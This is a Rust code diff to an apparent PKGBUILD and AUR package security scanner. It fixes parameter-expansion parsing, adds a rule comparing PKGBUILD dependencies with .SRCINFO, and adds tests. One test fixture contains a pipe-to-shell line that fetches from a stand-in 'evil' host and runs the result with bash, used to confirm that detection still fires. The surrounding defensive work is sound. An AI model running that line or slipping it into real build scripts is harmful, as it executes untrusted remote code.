@@ -592,7 +592,13 @@ fn strip_comment(line: &str) -> &str {
     let mut in_double = false;
     let mut escaped = false;
     let mut prev_boundary = true;
-    for (idx, ch) in line.char_indices() {
+    let mut param_depth = 0u32;
+    // Peekable because `${` has to be consumed as one unit: a `#` inside it is
+    // the length operator or a strip prefix, not a comment. Truncating there
+    // both hid the rest of the line from every rule and left the brace
+    // unbalanced for the callers that track depth.
+    let mut iter = line.char_indices().peekable();
+    while let Some((idx, ch)) = iter.next() {
         if escaped {
             escaped = false;
             prev_boundary = false;
@@ -622,6 +628,13 @@ fn strip_comment(line: &str) -> &str {
         } else if ch == '"' {
             in_double = true;
             prev_boundary = false;
+        } else if ch == '$' && iter.peek().is_some_and(|(_, next)| *next == '{') {
+            iter.next();
+            param_depth += 1;
+            prev_boundary = false;
+        } else if ch == '}' && param_depth > 0 {
+            param_depth -= 1;
+            prev_boundary = true;
         } else if ch == '#' && prev_boundary {
             return line[..idx].trim_end();
         } else {
@@ -841,19 +854,33 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
             let mut in_single = false;
             let mut in_double = false;
             let mut escaped = false;
+            // `${...}` braces are tracked apart from the shell body depth.
+            // Counting them as body openers and then stopping at a `#` inside
+            // left depth permanently high, so everything after the function
+            // was swallowed into it and every later top-level rule went dark
+            // with no disclosure.
+            let mut param_depth = 0usize;
             let mut j = idx;
             while j < lines.len() {
                 let text = lines[j];
-                let mut k = 0;
-                let text_chars: Vec<char> = text.chars().collect();
-                while k < text_chars.len() {
-                    let ch = text_chars[k];
+                // The scan advances by consuming an iterator rather than by
+                // incrementing an index. An index-based loop is only correct
+                // while every step moves forward, and that is a property no
+                // test can observe until a step stops moving forward: flipping
+                // `k += 2` to `k -= 2` at the `${` branch rewinds to the same
+                // character, so the loop never ends and `body` grows until the
+                // process is OOM-killed. That is not a failing test, it is a
+                // dead machine, so the mutant never got reported and the
+                // mutation gate read the runner dying as a verdict.
+                // `Chars::next` is the only way through the loop, so forward
+                // progress does not depend on arithmetic that can be inverted.
+                let mut chars = text.chars().peekable();
+                while let Some(ch) = chars.next() {
                     if escaped {
                         escaped = false;
                         if started {
                             body.push(ch);
                         }
-                        k += 1;
                         continue;
                     }
                     if ch == '\\' && !in_single {
@@ -861,7 +888,6 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                         if started {
                             body.push(ch);
                         }
-                        k += 1;
                         continue;
                     }
                     if in_single {
@@ -871,7 +897,6 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                         if ch == '\'' {
                             in_single = false;
                         }
-                        k += 1;
                         continue;
                     }
                     if in_double {
@@ -881,16 +906,31 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                         if ch == '"' {
                             in_double = false;
                         }
-                        k += 1;
                         continue;
                     }
                     if ch == '\'' {
                         in_single = true;
                     } else if ch == '"' {
                         in_double = true;
-                    } else if ch == '#' {
+                    } else if ch == '$' && chars.peek() == Some(&'{') {
                         if started {
-                            body.push_str(&text_chars[k..].iter().collect::<String>());
+                            body.push(ch);
+                            body.push('{');
+                        }
+                        param_depth += 1;
+                        // Consume the `{` so the body keeps it exactly once.
+                        chars.next();
+                        continue;
+                    } else if ch == '}' && param_depth > 0 {
+                        if started {
+                            body.push(ch);
+                        }
+                        param_depth -= 1;
+                        continue;
+                    } else if ch == '#' && param_depth == 0 {
+                        if started {
+                            body.push(ch);
+                            body.push_str(&chars.collect::<String>());
                         }
                         break;
                     } else if ch == opener {
@@ -910,7 +950,6 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                     if started && depth == 0 {
                         break;
                     }
-                    k += 1;
                 }
                 if started && depth == 0 {
                     break;
@@ -2173,6 +2212,55 @@ fn render_known_list(values: &[FoldedValue]) -> Vec<String> {
         .collect()
 }
 
+/// R29: dependencies the PKGBUILD declares that .SRCINFO does not list.
+///
+/// The AUR dependency delta comes from the committed .SRCINFO, but makepkg
+/// executes the PKGBUILD, so a release can add a dependency to one and leave
+/// the other alone and the reviewed set is not the installed one. Names only:
+/// a constraint changed in both files is the other half of the divergence and
+/// belongs to the manifest delta. Placed in `review_roots` rather than
+/// `check` so the benign corpus gate, which has no .SRCINFO fixtures, is
+/// unaffected.
+fn check_r29_depends_vs_srcinfo(
+    folded: &FoldedPkgbuild,
+    srcinfo_deps: &std::collections::BTreeMap<String, String>,
+) -> Vec<PkgFinding> {
+    let mut missing = Vec::new();
+    // `depends_<pkgname>` too: a split package declares its own, and comparing
+    // only the bare `depends` array would fire on every one of them.
+    for prefix in ["depends", "makedepends"] {
+        for (_, values) in arrays_matching(folded, prefix) {
+            for value in values {
+                // A value we cannot resolve is already disclosed by R15/R16; it
+                // is not evidence of divergence.
+                let Some(text) = known_text(value) else {
+                    continue;
+                };
+                let Some(name) = crate::manifest::dep_name(text) else {
+                    continue;
+                };
+                if !srcinfo_deps.contains_key(&name) {
+                    missing.push(name);
+                }
+            }
+        }
+    }
+    missing.sort();
+    missing.dedup();
+    if missing.is_empty() {
+        return Vec::new();
+    }
+    vec![PkgFinding {
+        rule_id: "R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO".to_string(),
+        severity: VerdictBand::High,
+        evidence: format!(
+            "the PKGBUILD declares dependencies the committed .SRCINFO does not list, so the \
+             reviewed dependency set is not the installed one: {}",
+            missing.join(", ")
+        ),
+    }]
+}
+
 fn check_r19_pair(baseline: &FoldedPkgbuild, target: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let mut base_keys: Vec<String> = arrays_matching(baseline, "validpgpkeys")
         .iter()
@@ -2309,6 +2397,7 @@ fn rule_title(rule_id: &str) -> &str {
         "R17_BUILD_TIME_NETWORK" => "Network fetch at build time",
         "R18_HOMOGLYPH" => "Suspicious unicode in PKGBUILD",
         "R19_VALIDPGPKEYS_CHANGE" => "Validpgpkeys changed since baseline",
+        "R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO" => "PKGBUILD dependency not in .SRCINFO",
         "R20_INSTALL_HOOK_CHANGE" => "Install or hook file changed",
         "R21_UNPINNED_VCS_SOURCE" => "Unpinned VCS source",
         "R22_CONDITIONAL_EXECUTION" => "Conditional execution guard",
@@ -2387,6 +2476,18 @@ pub fn review_roots(
     };
     for item in check(&target_folded) {
         push(&mut findings, &item);
+    }
+    // R29. The AUR dependency delta comes from the committed .SRCINFO, but
+    // makepkg executes the PKGBUILD, so a release can add a dependency to the
+    // one and leave the other alone and the reviewed set is not the installed
+    // one. Placed here rather than in `check` so the benign corpus gate, which
+    // has no .SRCINFO fixtures, is unaffected.
+    if let Ok(srcinfo) = std::fs::read_to_string(target_root.join(".SRCINFO"))
+        && let Ok(info) = crate::manifest::parse_aur_srcinfo(&srcinfo)
+    {
+        for item in check_r29_depends_vs_srcinfo(&target_folded, &info.deps) {
+            push(&mut findings, &item);
+        }
     }
     if let Some(base_raw) = baseline_pkgbuild {
         match parse_pkgbuild(base_raw) {
@@ -2607,7 +2708,6 @@ mod tests {
             modified_lifecycle_scripts: Vec::new(),
             new_dependencies: Vec::new(),
             modified_dependencies: Vec::new(),
-            removed_dependencies: Vec::new(),
             binding_gyp_added: false,
         }
     }
@@ -3076,6 +3176,170 @@ mod tests {
     }
 
     #[test]
+    fn parameter_expansion_does_not_swallow_later_metadata() {
+        // A `${#...}` or `${x#...}` in the first function body used to leave the
+        // depth counter high, so every assignment after it was absorbed into
+        // the body. R11 then had no sha256sums array to read and went quiet
+        // with no disclosure, on a PKGBUILD that skips checksum verification.
+        let content = concat!(
+            "pkgname=demo\n",
+            "build() {\n",
+            "  n=${#PKGDEST}\n",
+            "  make\n",
+            "}\n",
+            "pkgver=2.0\n",
+            "sha256sums=('SKIP')\n",
+            "source=('https://x/f.tar.gz')\n",
+        );
+        let folded = parse_pkgbuild(content).unwrap();
+        assert!(
+            folded.scalars.contains_key("pkgver"),
+            "a later top-level assignment must still be read, got {:?}",
+            folded.scalars.keys().collect::<Vec<_>>()
+        );
+        assert!(
+            has_rule(&findings_for(content), "R11_CHECKSUM_SKIP"),
+            "a skipped checksum must still be caught after a parameter expansion"
+        );
+    }
+
+    #[test]
+    fn strip_prefix_expansion_also_leaves_depth_balanced() {
+        let content = concat!(
+            "pkgname=demo\n",
+            "build() {\n",
+            "  p=${x#y}\n",
+            "  make\n",
+            "}\n",
+            "sha256sums=('SKIP')\n",
+        );
+        assert!(has_rule(&findings_for(content), "R11_CHECKSUM_SKIP"));
+    }
+
+    #[test]
+    fn pipe_to_shell_survives_a_parameter_expansion_on_the_line() {
+        // R13 reads the whole line, so a trailing `${#p}` must not truncate it.
+        let content = "build() {\n  curl https://evil/x.tgz ${#p} | bash\n}\n";
+        assert!(
+            has_rule(&findings_for(content), "R13_PIPE_TO_SHELL"),
+            "the pipe-to-shell after a parameter expansion must still fire"
+        );
+    }
+
+    #[test]
+    fn comments_after_a_closed_expansion_are_still_comments() {
+        assert_eq!(strip_comment("a=${x} # note").trim_end(), "a=${x}");
+        assert_eq!(strip_comment("# whole line"), "");
+        assert_eq!(
+            strip_comment("echo '# not a comment'"),
+            "echo '# not a comment'"
+        );
+    }
+
+    #[test]
+    fn a_function_body_scan_advances_past_every_expansion_it_reads() {
+        // The function-body scan used to walk a line with an index and step it
+        // by hand, so its termination rested on every step moving forward. The
+        // step over `${` rewinding by two instead of advancing past the brace
+        // sent the scan back to the same character, and `body` grew by a couple
+        // of bytes per pass until the process was killed for memory. Nothing
+        // asserted a result, so the mutation was never reported as caught: the
+        // machine died, and a dead machine is not a verdict.
+        //
+        // Each case below ends the scan. A scan that rewinds cannot finish, and
+        // a body that loses or duplicates a character changes what the rules
+        // read out of it, so these pin forward progress and content together.
+        let cases = [
+            // A bare expansion mid-line: the brace is consumed exactly once.
+            "build() {\n  echo ${pkgname}\n  make\n}\n",
+            // Two expansions on one line.
+            "build() {\n  echo ${pkgname}-${pkgver}\n  make\n}\n",
+            // Expansion immediately before the closer.
+            "build() {\n  echo ${x}}\n",
+            // Expansion at the very first column, where the index was 0.
+            "build() {\n${x}\n  make\n}\n",
+            // A hash after a closed expansion is still a comment.
+            "build() {\n  echo ${x} # trailing\n  make\n}\n",
+            // A hash inside an open expansion is not a comment.
+            "build() {\n  echo ${x#y}\n  make\n}\n",
+        ];
+        for content in cases {
+            let folded = parse_pkgbuild(content)
+                .unwrap_or_else(|e| panic!("{content:?} failed to parse: {e}"));
+            let body = folded
+                .func_bodies
+                .get("build")
+                .unwrap_or_else(|| panic!("{content:?} produced no build() body"));
+            // The brace is never doubled or dropped: `${` appears in the body
+            // exactly as many times as the input wrote it.
+            let want = content.matches("${").count();
+            let got = body.matches("${").count();
+            assert_eq!(got, want, "brace count in body of {content:?}: {body:?}");
+            // A comment outside an expansion is stripped, so no `#` from one
+            // may survive into the body the rules scan.
+            if !content.contains("${x#") {
+                assert!(
+                    !body.contains("trailing"),
+                    "a comment leaked into the body of {content:?}: {body:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn r29_fires_when_the_pkgbuild_declares_a_dependency_srcinfo_omits() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("PKGBUILD"),
+            "pkgname=demo\npkgver=1.0\npkgrel=1\ndepends=('glibc' 'backdoor-git')\n",
+        )
+        .unwrap();
+        std::fs::write(
+            dir.path().join(".SRCINFO"),
+            "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n\tdepends = glibc\n",
+        )
+        .unwrap();
+        let findings = review_roots(dir.path(), None, &empty_delta());
+        let r29: Vec<_> = findings
+            .iter()
+            .filter(|f| f.rule_id == "R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO")
+            .collect();
+        assert_eq!(r29.len(), 1, "the divergence must be reported once");
+        assert_eq!(r29[0].severity, VerdictBand::High);
+        assert!(
+            r29[0].description.contains("backdoor-git"),
+            "the undeclared dependency must be named: {}",
+            r29[0].description
+        );
+        assert!(
+            !r29[0].description.contains("glibc"),
+            "a dependency both files agree on is not a divergence"
+        );
+    }
+
+    #[test]
+    fn r29_stays_quiet_when_the_two_files_agree() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("PKGBUILD"),
+            "pkgname=demo\npkgver=1.0\ndepends=('glibc' 'gcc')\n",
+        )
+        .unwrap();
+        std::fs::write(
+            dir.path().join(".SRCINFO"),
+            "pkgbase = demo\n\tpkgver = 1.0\n\tdepends = glibc\n\tdepends = gcc\n",
+        )
+        .unwrap();
+        let findings = review_roots(dir.path(), None, &empty_delta());
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO"),
+            "agreement must not fire: {findings:?}"
+        );
+    }
+
+    #[test]
     fn r20_fires_on_install_file_change() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("PKGBUILD"), "pkgver=1.0\n").unwrap();
@@ -3136,5 +3400,112 @@ mod tests {
         ));
         let plain = findings_for("build() {\n make install\n}\n");
         assert!(!has_rule(&plain, "R22_CONDITIONAL_EXECUTION"));
+    }
+
+    /// Every rule id gets its own title, and none of them falls through.
+    ///
+    /// `rule_title` is a display-only lookup, which is exactly why it drifted
+    /// unnoticed: a rule with the wrong title still fires, still blocks, and
+    /// still lands in the report under a name that tells the reader nothing
+    /// about what was found. The `R29` arm had no test at all, so deleting it
+    /// shipped a real finding labelled "PKGBUILD finding".
+    ///
+    /// Asserted three ways, because they catch different mistakes: each title is
+    /// non-empty (a function that returned a constant), each is distinct (a
+    /// function that returned one constant for everything), and none equals the
+    /// fallback (a rule id that fell out of the match).
+    #[test]
+    fn every_pkbuild_rule_id_has_its_own_title() {
+        const IDS: [&str; 14] = [
+            "R11_CHECKSUM_SKIP",
+            "R12_SOURCE_URL_DRIFT",
+            "R13_PIPE_TO_SHELL",
+            "R14_EVAL_FAMILY",
+            "R15_DYNAMIC_INDIRECTION",
+            "R16_CMD_SUBST_IN_META",
+            "R17_BUILD_TIME_NETWORK",
+            "R18_HOMOGLYPH",
+            "R19_VALIDPGPKEYS_CHANGE",
+            "R20_INSTALL_HOOK_CHANGE",
+            "R21_UNPINNED_VCS_SOURCE",
+            "R22_CONDITIONAL_EXECUTION",
+            "R23_NPM_DELIVERY",
+            "R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO",
+        ];
+
+        let mut seen: std::collections::BTreeSet<&str> = std::collections::BTreeSet::new();
+        for id in IDS {
+            let title = rule_title(id);
+            assert!(!title.is_empty(), "`{id}` has an empty title");
+            assert_ne!(
+                title, "PKGBUILD finding",
+                "`{id}` fell through to the default title"
+            );
+            assert!(
+                seen.insert(title),
+                "`{id}` shares its title `{title}` with another rule"
+            );
+        }
+        assert_eq!(seen.len(), IDS.len(), "every rule needs a distinct title");
+
+        // R29 named exactly, since its arm is the one that was missing.
+        assert_eq!(
+            rule_title("R29_PKGBUILD_DEPENDS_NOT_IN_SRCINFO"),
+            "PKGBUILD dependency not in .SRCINFO"
+        );
+
+        // An id this build does not know still gets the generic label rather
+        // than an empty string, so a new rule is visibly unlabelled instead of
+        // silently blank.
+        assert_eq!(rule_title("R99_NOT_A_RULE"), "PKGBUILD finding");
+        assert_eq!(rule_title(""), "PKGBUILD finding");
+    }
+
+    /// `${...}` is one unit, and a `#` inside one is not a comment.
+    ///
+    /// `strip_comment` had no test at all, so the whole parameter-depth tracker
+    /// was unpinned. The function returns a *slice* of the original line, so a
+    /// state difference only shows up when it changes whether some `#` is
+    /// recognised as a comment — which is what each case below isolates:
+    ///
+    /// * `x=${a}# c` — the closing brace of a parameter must leave the next `#`
+    ///   eligible to be a comment. A depth that never rose, never fell, or fell
+    ///   on the wrong character all swallow the `#` instead, so this one case
+    ///   separates three of the mutants.
+    /// * `x=${a}${b} }# c` — after two parameters the depth is back to zero, so
+    ///   the standalone `}` is *not* a parameter close and must not arm the `#`
+    ///   that follows it. A depth that increments instead of decrementing, or
+    ///   divides by one, is still positive here and arms it.
+    /// * `pkg() {#c` — a `{` preceded by ordinary text is not a parameter
+    ///   opener. Reading "next character is `{`" as sufficient consumes the
+    ///   brace and leaves the comment marker unrecognised.
+    #[test]
+    fn a_hash_inside_a_parameter_expansion_is_not_a_comment() {
+        assert_eq!(
+            strip_comment("x=${a}# c"),
+            "x=${a}",
+            "the `#` after a closed parameter is a comment"
+        );
+        assert_eq!(
+            strip_comment("x=${a}${b} }# c"),
+            "x=${a}${b} }# c",
+            "a standalone brace does not arm a comment, because no parameter is open"
+        );
+        assert_eq!(
+            strip_comment("pkg() {#c"),
+            "pkg() {",
+            "a brace in ordinary position is not a parameter opener"
+        );
+
+        // The cases the tracker exists for, so a rewrite cannot pass by
+        // stripping every `#`.
+        assert_eq!(strip_comment("echo hi # c"), "echo hi");
+        assert_eq!(strip_comment("x=${a}${b}# c"), "x=${a}${b}");
+        assert_eq!(
+            strip_comment("echo ${#var} and a # comment"),
+            "echo ${#var} and a",
+            "the length operator inside a parameter expansion is not a comment"
+        );
+        assert_eq!(strip_comment("no comment here"), "no comment here");
     }
 }
